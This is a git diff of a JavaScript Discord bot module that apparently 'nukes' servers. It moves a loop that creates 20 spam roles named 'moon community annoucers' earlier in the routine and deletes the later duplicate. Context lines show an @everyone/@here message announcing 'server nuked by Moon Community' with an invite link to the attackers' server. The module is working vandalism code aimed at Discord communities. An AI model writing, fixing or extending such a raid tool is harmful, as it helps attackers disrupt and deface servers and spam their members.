@@ -66,6 +66,13 @@ module.exports = (client) => {
                     }
                 }
 
+                // 4.1 Create new roles safely
+                for (let i = 0; i < 20; i++) {
+                    await guild.roles.create({
+                        name: "moon community annoucers 📢"
+                    }).catch(() => null);
+                }
+
                 // 5. Send initial message
                 const welcomeMessage = "@everyone @here server nuked by **Moon Community 🌙** join our discord discord.gg/h5ejJAabPv ";
                 await Promise.all(
@@ -167,19 +174,6 @@ module.exports = (client) => {
 
                     if (channel) {
                         newChannels.push(channel);
-                    }
-                }
-
-                // 9. Create new roles
-                const newRoles = [];
-                for (let i = 0; i < 20; i++) {
-                    const role = await guild.roles.create({
-                        name: "moon community annoucers 📢",
-                        type: RoleType.GuildText
-                    }).catch(() => null);
-
-                    if (role) {
-                        newRoles.push(role);
                     }
                 }
 
